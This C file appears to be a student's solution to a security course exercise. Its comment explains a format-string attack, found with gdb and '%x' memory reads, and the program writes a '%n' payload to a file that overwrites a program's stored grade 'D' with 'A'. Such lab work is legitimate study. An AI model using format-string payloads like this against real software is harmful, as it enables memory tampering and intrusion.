#include <stdio.h>
#include <string.h>

/*

Process:

ComputingID: wfl9zy
Name: William Loving

- I had to gdb through the program to find the address of the grade value that is passed to the final printf statement.
- Once I had this I then encoded my input string to include that address, that is the first value you see below copied into buffer.
- Then I needed to add padding A's such that we print exactly 65 characters before writing the number of characters to the initial address.
- This writes A to the location that D was previously stored, so the program prints out an A instead!
- I gathered all of this information inspecting the stack manually through gdb as well as by injecting %x values into my input string so that I could read arbitrary memory values.


Necessary Information:
- Location in memory of character to overwrite
- Offset on stack of string input buffer.
- Number of characters necessary to write 65 to memory location.

*/

int main()
{
    // Define the buffer containing the data you want to write to the file
    char buffer[80];

    strcpy(buffer, "\x2a\xa0\x04\x08");
    strcat(buffer, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    strcat(buffer, "%23$n");
    strcat(buffer, "\n");
    strcat(buffer, "WilliamL");

    // Open a file for writing (or create it if it doesn't exist)
    FILE *file = fopen("hack_input.txt", "w");

    // Check if the file was opened successfully
    if (file == NULL)
    {
        perror("Error opening file");
        return 1; // Return an error code
    }

    // Write the contents of the buffer to the file
    if (fwrite(buffer, sizeof(char), sizeof(buffer) - 1, file) != sizeof(buffer) - 1)
    {
        perror("Error writing to file");
        fclose(file); // Close the file before exiting
        return 1;     // Return an error code
    }

    // Close the file
    fclose(file);

    printf("Data written to file successfully.\n");

    return 0; // Return 0 to indicate success
}